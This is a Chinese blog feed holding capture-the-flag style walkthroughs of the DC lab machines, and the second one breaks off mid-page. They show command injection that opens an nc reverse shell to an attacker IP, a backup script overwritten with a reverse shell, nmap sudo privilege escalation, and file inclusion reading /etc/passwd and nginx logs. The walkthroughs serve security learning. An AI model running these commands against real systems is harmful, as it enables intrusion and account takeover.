alt="img"></p><p>根据提示信息：</p><p><code>Convert</code>按钮将会把IP地址或整型数据转化成与之等价的整型数据或IP地址。</p><p><code>Lookup</code>按钮会尝试去解决将一个IP地址转换为主机名字的问题。后面还说，如果dig在web服务器上安装了，那也可以被用作<code>搜索</code></p><p>然后我们可以尝试抓包，看看是什么效果：</p><ul><li><code>Convert</code>按钮</li></ul><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721639725380.png" alt="img"></p><ul><li><code>Lookup</code>按钮</li></ul><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721639777147.png" alt="img"></p><p>两个按钮控件抓取的数据包好像没什么差别。也可能是因为输入的测试数据简单且不是命令。</p><p>从上面提示入手，<code>Lookup</code>按钮提示有：如果dig在web服务器上安装了，那也可以被用作<code>搜索</code>。那么我们就尝试输入与搜索相关的指令。</p><p>执行<code>ls</code>命令，抓包：<br><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721640027157.png" alt="img"></p><p>好像也没啥特别的。数据包内没有出现目录列表，网站中也没有出现目录列表。</p><p>输入域名，好像也没啥特别之处：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721640165117.png" alt="img"></p><p>尝试使用并列执行命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">baidu.com|<span class="hljs-built_in">ls</span><br></code></pre></td></tr></table></figure><p>完全放行完请求数据包后，发现在目标网站上出现了响应数据：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721640264134.png" alt="img"></p><p>可以发现的是，这里执行了并行符号后面的<code>ls</code>指令。难道是需要有<code>|</code>符号在目标指令的前面才行？</p><p>尝试<code>|ls</code>，发现这样又不行了。</p><p>猜测不仅需要有<code>|</code>，还需要更多。</p><p>尝试<code>.com|ls</code>，发现这样又成功了！</p><p>尝试<code>.|ls</code> ，发现成功了！</p><p>这样以来，想要执行指令的最简便方式就是<code>.| + 目标指令</code></p><p>那就直接执行反弹shell的指令呗！</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -e /bin/bash 192.168.204.128 9999<br>.|nc -e /bin/bash 192.168.204.128 9999<br></code></pre></td></tr></table></figure><p>发现有前端输入长度限制：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721640859469.png" alt="img"></p><p>那我们就尝试修改数据包吧！修改完成后重放！</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721640983822.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721641019990.png" alt="img"></p><p>ok！成功获得反弹shell。</p><p>切换交互界面：<code>python -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;</code></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721641094356.png" alt="img"></p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h3 id="命令提权"><a href="#命令提权" class="headerlink" title="命令提权"></a>命令提权</h3><p>首先查看具有SUID权限的命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -perm -u=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/null<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721641213920.png" alt="img"></p><p>其中可以进行提权的有：<code>passwd</code>、<code>su</code>、<code>mount</code>、<code>umount</code>。但按照以往的经验，这些指令一般都无法成功提权。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo -l<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721641376061.png" alt="img"></p><p>也没有获得什么有用的提示。</p><h3 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h3><p>无法根据已有命令进行提权后，我们就需要去重新搜集一些有用的信息了。</p><p>使用<code>ls</code>命令查看目录列表：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721641640491.png" alt="img"></p><p>这也太多了吧。。。。而且它们大多都是php代码文件。</p><p>尝试切换用户，之前我们在浏览网站的时候收到了团队核心人物介绍，说 jens 是他们开发团队的重要人物，那我们就先切换到 jens用户吧。</p><p>使用<code>su</code>命令，但是！需要有对应用户的密码呀！</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721647126070.png" alt="img"></p><p>所以还是得从mark账户下的文件查找有关信息。</p><p>mark目录下还是有几个文件的：</p><blockquote><p>js 、maint 、css、images、network、user、includes </p></blockquote><p>只能逐一进行访问咯。其中：<br>· js 文件主要包含用于前端开发的 js 代码文件。js文件夹里面也全都是 js 代码文件。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721647469829.png" alt="img"></p><p>· maint 文件夹下只包含了一个修复php文件。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721647491273.png" alt="img"></p><p>· css文件夹下主要包含的是构成网页外观和样式的代码文件。其下也基本都是css代码文件，虽然有一个”colors“文件夹，但是看名字就知道应该跟我们想要的信息无关。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721647651932.png"></p><p>· images文件夹同css理，其下全都是图像文件。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721647783119.png" alt="img"></p><p>· network文件夹，其下也全都是些php代码文件。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721647828646.png" alt="img"></p><p>· user文件夹，听名字感觉可能会找到有用信息，查看其目录列表。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721647924638.png" alt="img"></p><blockquote><p>about.php  credits.php   index.php  privacy.php  user-edit.php<br>admin.php  freedoms.php  menu.php   profile.php</p></blockquote><p>逐一访问了上述php文件，均没找到有用的可以利用的信息。</p><p>· includes 文件夹，看了一下，也全都是php文件，浅判断为没啥有用的信息。</p><p>如上，可以得知，在mark用户的<code>/var/www/html/wp-admin</code>目录下，没有什么有价值的信息。返回根目录进行查看。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721648522524.png" alt="img"></p><p>发现其中有<code>home</code>目录，home目录通常为用户主目录，也许会记录有用户的相关信息，比如密码之类的。</p><p>进去看！！！！！！！！</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721648640692.png" alt="img"></p><p>果然，分别对应有四个用户的用户文件。</p><p>分别进去查看呗。</p><ul><li>graham</li></ul><p>什么都没有。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721648731950.png" alt="img"></p><ul><li>jens</li></ul><p>只有一个不知道用于备份什么的备份脚本文件<code>backups.sh</code>（backup：程序或文件的备份，拷贝）</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721648770504.png" alt="img"></p><p>查看该脚本文件的内容：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721648879649.png" alt="img"></p><p>好，没啥有用的信息。</p><ul><li>mark</li></ul><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721649004211.png" alt="img"></p><p>好了，终于可以触发连招了，”stuff：某个物质、材料、一组物品“，其下还有一个<code>things-to-do.txt</code>文件，看着像是待办。</p><p>cat一下呗：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721649141874.png" alt="img"></p><p>有一个添加新用户,而且已经完成，在其中发现了<code>graham</code>的账户。</p><blockquote><p>user：graham</p><p>password：GSo7isUM1D4</p></blockquote><ul><li>sarah</li></ul><p>什么有没有呀</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721649261175.png" alt="img"></p><h3 id="切换graham用户"><a href="#切换graham用户" class="headerlink" title="切换graham用户"></a>切换graham用户</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">su graham<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721649353583.png" alt="img"></p><p>可以发现其下也分别拥有四个用户的文件。</p><p>tomato，继续搜集信息！</p><p>· 还是继续先查看各个用户下的文件吧：</p><blockquote><p>graham : 空，什么文件都没有。（<code>~</code>表示当前账户用户的意思）</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721651383415.png" alt="img"></p><blockquote><p>jens ：同样只有那个<code>backups.sh</code>备份脚本</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721651471925.png" alt="img"></p><blockquote><p>mark：和之前在mark用户所拥有的信息一致</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721651540788.png" alt="img"></p><blockquote><p>sarah：空，什么文件都没有</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721651582411.png" alt="img"></p><p>· 查看 sudo 配置信息。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo -l<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721649480690.png" alt="img"></p><p>有关于jens的提示：jens是无密码用户（NOPASSWD），这意味着我们无法切换到他，这个文件就是在mark的home目录下的jens文件下的备份脚本。</p><blockquote><p> (jens) NOPASSWD: &#x2F;home&#x2F;jens&#x2F;backups.sh</p></blockquote><p>不过这里既然都提示了这个脚本，那就执行看看吧。</p><p>进入到对应目录下执行<code>./backups.sh</code></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721651683654.png" alt="img"></p><p>可以看到，由于权限不足，请求被拒绝了。</p><p>我们是在graham的账户上尝试去执行jens的脚本文件，好像权限不足也能理解。</p><p>所以我们需要使用sudo命令通过 jens 用户的身份去执行这个脚本文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo -u jens ./backups.sh<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721651934366.png" alt="img"></p><p>命令执行后下面显示的这段提示告诉我们：</p><blockquote><p><code>tar</code>在解压缩过程中自动处理了文件名，移除了开头的<code>/</code>，以保证解压缩到当前目录下的正确路径。</p></blockquote><p>因此，<code>backups.sh</code>中的解压缩命令被成功执行了！</p><p>那我们将其中的命令修改为反弹shell的指令，那它不就乖乖执行了，我们不久获得jens用户的登陆权限了吗！</p><h3 id="切换jens用户"><a href="#切换jens用户" class="headerlink" title="切换jens用户"></a>切换jens用户</h3><p>尝试使用vim进行修改，但发现不存在vim命令，可能是命令限制。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721652717673.png" alt="img"></p><p>那我们就是用<code>echo</code>命令进行覆盖式写入：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;nc -e /bin/bash 192.168.204.128 6666&quot;</span> &gt; backups.sh<br></code></pre></td></tr></table></figure><p>cat一下查看效果：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721652871391.png" alt="img"></p><p>新开一个终端进行端口监听：<code>nc -lvvp 6666</code><br><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721652959342.png" alt="img"></p><p>成功！</p><p>查找flag文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -name *flag*<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721653106562.png" alt="img"></p><p>由于权限不足被拒绝了捏。</p><p>查看具有SUID权限的命令！</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -perm -u=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/null<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721653199105.png" alt="img"></p><p>好像没啥有用的可提权命令，查看sudo配置信息：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo -l<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721653212105.png" alt="img"></p><p>ok！获知<code>nmap</code>可以用来提权。</p><blockquote><p> (root) NOPASSWD: &#x2F;usr&#x2F;bin&#x2F;nmap</p></blockquote><h3 id="nmap提权"><a href="#nmap提权" class="headerlink" title="nmap提权"></a>nmap提权</h3><p><a href="https://blog.csdn.net/a1_pha/article/details/135448072">nmap提权</a></p><p>在jens用户目录下逐一执行以下命令：（命令的详细含义参考上面的链接）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">TF=$(<span class="hljs-built_in">mktemp</span>)<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;os.execute(&quot;/bin/sh&quot;)&#x27;</span> &gt; <span class="hljs-variable">$TF</span><br>sudo nmap --script=<span class="hljs-variable">$TF</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721653886328.png" alt="img"></p><p>ok！提权成功！</p><p>寻找flag文件！</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721654002112.png" alt="img"></p><p>ok！至此，全部操作结束。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul><li>namp提权方法：</li></ul><blockquote><p>TF&#x3D;$(mktemp)<br>echo ‘os.execute(“&#x2F;bin&#x2F;sh”)’ &gt; $TF<br>sudo nmap –script&#x3D;$TF</p></blockquote><ul><li><p>重定向修改：本地hosts文件添加“IP域名”绑定项。</p></li><li><p>爆破真的是一项大工程，可能由于字典很大没法进行，所以爆破不出来可能只是字典的原因罢了</p></li><li><p>提权方法千千万，善于利用信息才好办，多找信息，多找方法，最终估计还得命令提权</p></li><li><p>后台系统找命令执行很重要，怎么拿到一个webshell确实很重要</p></li><li><p>可以通过别的用户权限的可执行文件去切换用户或者提权（我们最后就是通过jens用户提权成功的）</p></li></ul>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>DC-5</title>
    <link href="/2024/07/30/DC-5/"/>
    <url>/2024/07/30/DC-5/</url>
    
    <content type="html"><![CDATA[<h1 id="DC-5"><a href="#DC-5" class="headerlink" title="DC-5"></a>DC-5</h1><h2 id="IP扫描"><a href="#IP扫描" class="headerlink" title="IP扫描"></a>IP扫描</h2><p>开关靶机，分别进行扫描：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -sN 192.168.204.0/24<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240717094648444.png" alt="image-20240717094648444"></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240717094804833.png" alt="image-20240717094804833"></p><p>确认得到目标靶机的IP地址：<code>192.168.204.134</code></p><h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><ul><li>简便版扫描</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -sN -p- 192.168.204.134<br>nmap -sT -p- 192.168.204.134<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240717095154440.png" alt="image-20240717095154440"></p><p>可以知道，开放的服务端口一共有三个：<code>80</code>、<code>111</code>、<code>48004</code>，三个端口对应的开放服务为：<code>http</code>、<code>rpcbind</code>、<code>nimbusdb</code></p><blockquote><p>rpcbind是NFS中用来进行消息通知的服务。</p><p>NimbusDB 是一个云数据库解决方案，旨在提供高可用性和弹性，适用于各种应用程序。它通常支持多种数据模型，如文档、图形和关系型数据，并且常用于需要快速扩展和高性能的场景</p></blockquote><ul><li>详细版扫描</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -sT -sV -sC -O -p 80,111,48004 192.168.204.134<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240717100525580.png" alt="image-20240717100525580"></p><p>根据结果信息可以看到，目标靶机应该有一个网页界面。尝试在浏览器中访问目标靶机IP地址<code>192.168.204.134</code>。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240717100650334.png" alt="image-20240717100650334"></p><p>可以看到，确实有welcome信息。在进行网页各个项目浏览的时候，好像也没发现什么有用的特别的信息。为了进一步确认是否还有其它有用的信息。使用指纹工具识别该网页的技术构成。</p><ul><li>指纹识别</li></ul><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240717101310142.png" alt="image-20240717101310142"></p><p>好，除了得知<code>Nginx的版本为 1.6.2</code>，其他的确认没啥有用的信息了。</p><h2 id="nmap漏扫"><a href="#nmap漏扫" class="headerlink" title="nmap漏扫"></a>nmap漏扫</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -script=vuln -p 80,111,48004 192.168.204.134<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240717101803699.png" alt="image-20240717101803699"></p><p>根据漏扫信息，可以知道，目标靶机可能存在一个CSRF漏洞：</p><blockquote><p><a href="http://192.168.204.134/contact.php">http://192.168.204.134:80/contact.php</a></p></blockquote><blockquote><p>CSRF漏洞是因为web应用程序在用户进行敏感操作时，如修改账号密码、添加账号、转账等，没有校验表单token或者http请求头中的referer值，从而导致恶意攻击者利用普通用户的身份（cookie）完成攻击行为。</p></blockquote><p>言外之意就是，需要攻击方和用户操作方二者都进行操作，才可以完成的攻击行为。</p><p>靶场的攻打自然没有跟我们“互动”的用户。所以CSRF漏洞利用的思路可以暂时搁置了。</p><h2 id="gobuster目录爆破"><a href="#gobuster目录爆破" class="headerlink" title="gobuster目录爆破"></a>gobuster目录爆破</h2><p>截至目前为止，好像都没啥有用的信息，那就尝试进行目录爆破吧~</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gobuster <span class="hljs-built_in">dir</span> -u http://192.168.204.134 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt<br></code></pre></td></tr></table></figure><p>爆破得到的结果如下：</p><blockquote><p><a href="http://192.168.204.134/images/">http://192.168.204.134/images/</a></p><p><a href="http://192.168.204.134/css/">http://192.168.204.134/css/</a></p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240717102851778.png" alt="image-20240717102851778"></p><p>尝试访问爆破得到的两个链接，结果都显示为：<code>403 Forbidden</code></p><blockquote><p>403 Forbidden是网站访问过程中，常见的错误提示。资源不可用，服务器理解客户的请求，但拒绝处理它。这通常是由于服务器上文件或目录的权限设置导致，简单的理解为没有权限访问此站。</p></blockquote><p>所以，gobuster目录爆破也没得出什么有用的信息！！！！这个时候不要气馁，切换思路，爆破结果会不会跟使用的爆破字典有关系，我们可以尝试切换爆破工具进行再次爆破。</p><p>使用<code>dirsearch</code>试一下吧！</p><h2 id="dirsearch目录爆破"><a href="#dirsearch目录爆破" class="headerlink" title="dirsearch目录爆破"></a>dirsearch目录爆破</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">dirsearch -u http://192.168.204.134<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240717103657468.png" alt="image-20240717103657468"></p><p>咦！kali默认没有<code>dirsearch</code>，所以要先进行安装。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">apt-get update<br>apt-get install dirsearch<br></code></pre></td></tr></table></figure><p>ok！安装完成后，进行dirsearch目录爆破</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240717104750906.png" alt="image-20240717104750906"></p><blockquote><p>&#x2F;contact.php</p><p><a href="http://192.168.204.134/css/">http://192.168.204.134/css/</a></p><p>&#x2F;faq.php</p><p>&#x2F;footer.php</p><p><a href="http://192.168.204.134/images/">http://192.168.204.134/images/</a></p><p>&#x2F;images&#x2F;</p><p>&#x2F;thankyou.php</p><p>这些都是目标靶机IP下的目录文件。</p></blockquote><h2 id="网页目录访问"><a href="#网页目录访问" class="headerlink" title="网页目录访问"></a>网页目录访问</h2><p>对上述爆破得到的目录在浏览器中逐一访问：</p><blockquote><p><a href="http://192.168.204.134/contact.php">http://192.168.204.134/contact.php</a></p><p><a href="http://192.168.204.134/css/">http://192.168.204.134/css/</a></p><p><a href="http://192.168.204.134/faq.php">http://192.168.204.134/faq.php</a></p><p><a href="http://192.168.204.134/footer.php">http://192.168.204.134/footer.php</a></p><p><a href="http://192.168.204.134/images/">http://192.168.204.134/images/</a></p><p><a href="http://192.168.204.134/thankyou.php">http://192.168.204.134/thankyou.php</a></p></blockquote><p>其中的<a href="http://192.168.204.134/css/%E5%92%8Chttp://192.168.204.134/images/%E4%B9%8B%E5%89%8D%E5%B7%B2%E7%BB%8F%E8%A2%AB%E8%AF%81%E6%98%8E%E6%B2%A1%E6%9C%89%E6%9D%83%E9%99%90%E8%AE%BF%E9%97%AE%E3%80%82">http://192.168.204.134/css/和http://192.168.204.134/images/之前已经被证明没有权限访问。</a></p><p>然后，<a href="http://192.168.204.134/contact.php%E5%92%8Chttp://192.168.204.134/faq.php%E5%88%86%E5%88%AB%E5%AF%B9%E5%BA%94%E7%9D%80%E7%BD%91%E9%A1%B5%E9%A6%96%E9%A1%B5%E4%B8%AD%E7%9A%84%60Contact%60%E5%92%8C%60FAQ%60%E6%A8%A1%E5%9D%97%E3%80%82%E4%B9%8B%E5%89%8D%E5%B7%B2%E7%BB%8F%E7%9C%8B%E8%BF%87%E4%BA%86%EF%BC%8C%E5%85%B6%E4%B8%AD%E6%B2%A1%E6%9C%89%E4%BB%80%E4%B9%88%E6%9C%89%E7%94%A8%E7%9A%84%E4%BF%A1%E6%81%AF%E3%80%82">http://192.168.204.134/contact.php和http://192.168.204.134/faq.php分别对应着网页首页中的`Contact`和`FAQ`模块。之前已经看过了，其中没有什么有用的信息。</a></p><p>访问<a href="http://192.168.204.134/footer.php%EF%BC%8C%E5%BE%97%E5%88%B0%EF%BC%9A">http://192.168.204.134/footer.php，得到：</a></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240717105942484.png" alt="image-20240717105942484"></p><p>最后的<a href="http://192.168.204.134/thankyou.php%EF%BC%8C%E5%BE%97%E5%88%B0%EF%BC%9A">http://192.168.204.134/thankyou.php，得到：</a></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240717105954567.png" alt="image-20240717105954567"></p><p>经过简单的对比可以发现，footer.php文件的内容与thankyou.php文件内容下的页脚内容一致，因此，可以大致猜测两个文件之间存在着<code>文件包含</code>关系。</p><p>从<code>文件包含</code>入手。</p><h2 id="文件包含漏洞利用"><a href="#文件包含漏洞利用" class="headerlink" title="文件包含漏洞利用"></a>文件包含漏洞利用</h2><p><a href="https://www.freebuf.com/articles/web/369924.html">Web漏洞之文件包含漏洞</a></p><blockquote><p>首先先来明确一下，文件包含漏洞利用，利用的是什么？怎么利用的？想要实现的效果又是什么？</p><p>答：</p><p>问题一，利用的自然是“文件包含漏洞”，由于对方通过php函数引入文件时，没有对传入的文件名进行合理的校验，从而导致操作了预想之外的文件。</p><p>问题二，文件包含的利用方法是，在搜索地址栏（或其它注入点）处，对于包含了其它文件的url，后面添加<code>？file=文件路径（精确到文件名）</code></p><p>问题三，利用文件包含漏洞，我们本着getshell的目的，当然是想要获取一些重要的文件信息。在linux系统下，在我们还未取得登陆账户的情况下，一般都是想查找密码或用户名文件：<code>/etc/passwd</code>（账户）、<code>/etc/shadow</code>（密码）</p></blockquote><p>综上，我们执行如下文件包含url:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://192.168.204.134/thankyou.php?file=/etc/passwd<br>http://192.168.204.134/thankyou.php?file=/etc/shadow<br></code></pre></td></tr></table></figure><p>在浏览器搜索框执行，得到如下结果：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240717142406079.png" alt="image-20240717142406079"></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240717174452209.png" alt="image-20240717174452209"></p><p><code>/etc/passwd</code>账户文件内容被成功返回并显示在浏览器页面中。这表明靶机网站确实存在文件包含漏洞。但是<code>/etc/shadow</code>密码文件并没有被成功显示在界面上，可以猜测是权限不足的问题。</p><h2 id="Get-shell"><a href="#Get-shell" class="headerlink" title="Get shell"></a>Get shell</h2><p><a href="https://www.freebuf.com/vuls/304690.html">红蓝对抗之服务攻防：Nginx中间件渗透总结</a></p><h3 id="先验知识"><a href="#先验知识" class="headerlink" title="先验知识"></a>先验知识</h3><blockquote><p>由上述端口扫描以及指纹识别可以得知，目标靶机网站使用的web服务器和反向代理是nginx（1.6.1版本）</p><p>nginx会将执行的命令记录下来并写入日志文件中，所以先读取一下nignx的配置信息，查看日志文件的位置</p></blockquote><h3 id="nginx日志文件读取"><a href="#nginx日志文件读取" class="headerlink" title="nginx日志文件读取"></a>nginx日志文件读取</h3><p><strong>总思路：利用<code>文件包含漏洞</code>，通过<code>burpsuite</code>抓取数据包获取nginx的不同日志文件。</strong></p><p><a href="https://blog.csdn.net/weixin_43945983/article/details/138070113">linux 查看nginx日志</a></p><blockquote><p>配置文件路径： &#x2F;etc&#x2F;nginx&#x2F;nginx.conf</p><p>错误日志路径：&#x2F;var&#x2F;log&#x2F;nginx&#x2F;error.log</p><p>访问日志：&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log</p><p>利用文件包含漏洞，进行”文件注入“：</p><p>?file&#x3D;&#x2F;etc&#x2F;nginx&#x2F;nginx.conf</p><p>?file&#x3D;&#x2F;var&#x2F;log&#x2F;nginx&#x2F;error.log</p><p>?file&#x3D;&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log</p></blockquote><p>对这三个目标”注入文件“进行逐一测试：</p><ul><li><strong>?file&#x3D;&#x2F;etc&#x2F;nginx&#x2F;nginx.conf</strong></li></ul><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240717170624251.png" alt="image-20240717170624251"></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240717170642477.png" alt="image-20240717170642477"></p><p>”注入“成功，对该数据包进行重放，看其响应内容。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240717171025161.png" alt="image-20240717171025161"></p><p>响应html内容中，在其中的发现了<code>访问日志和错误日志的文件路径</code>。</p><ul><li><strong>?file&#x3D;&#x2F;var&#x2F;log&#x2F;nginx&#x2F;error.log</strong></li></ul><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240717171427205.png" alt="image-20240717171427205"></p><p>同样进行数据包重放，在其响应内容中查找有用的信息。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240717200924814.png" alt="image-20240717200924814"></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240717200941862.png" 